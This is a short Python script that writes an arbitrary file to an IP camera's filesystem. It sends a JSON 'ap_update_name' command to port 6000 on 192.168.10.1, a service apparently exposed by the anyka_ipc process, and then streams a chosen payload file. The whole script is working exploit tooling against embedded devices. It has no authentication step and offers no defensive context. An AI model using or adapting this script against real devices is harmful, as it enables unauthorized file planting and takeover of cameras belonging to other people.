#######################################################
# Script for writing specified file to the filesystem #
# using 'ap_update_name' operator via port 6000       #
# hosted by anyka_ipc process (libcloudapi.so)        #
#######################################################

import socket
import json
import time
import hashlib
import sys

filename = sys.argv[1]

parameters = {
    "operator": "ap_update_name",
    "name": filename, # 31 total char limit for cmd
    "length": 0,  # Placeholder for length
    "md5": ""
}

# Read the contents of the payload file and update the "length" parameter
with open(filename, "rb") as file:
    payload_data = file.read()
    parameters["length"] = len(payload_data)

# Create a JSON string from the parameters
json_string = json.dumps(parameters)

# Define the server IP address and port
server_ip = "192.168.10.1"
server_port = 6000

print(f"Sending: {filename}")

# Create a socket and connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

# Send the JSON string to the server
client_socket.send(json_string.encode())

# Wait for a response (assuming a maximum response size of 1024 bytes)
response = client_socket.recv(1024)

# Decode and print the response
print("Response from server:", response.decode())

# Check if the response is "OK" before sending the payload data
if "OK" in response.decode():
    # Send the payload data
    print("Sending:", payload_data)

    client_socket.send(payload_data)

# Close the socket
client_socket.close()
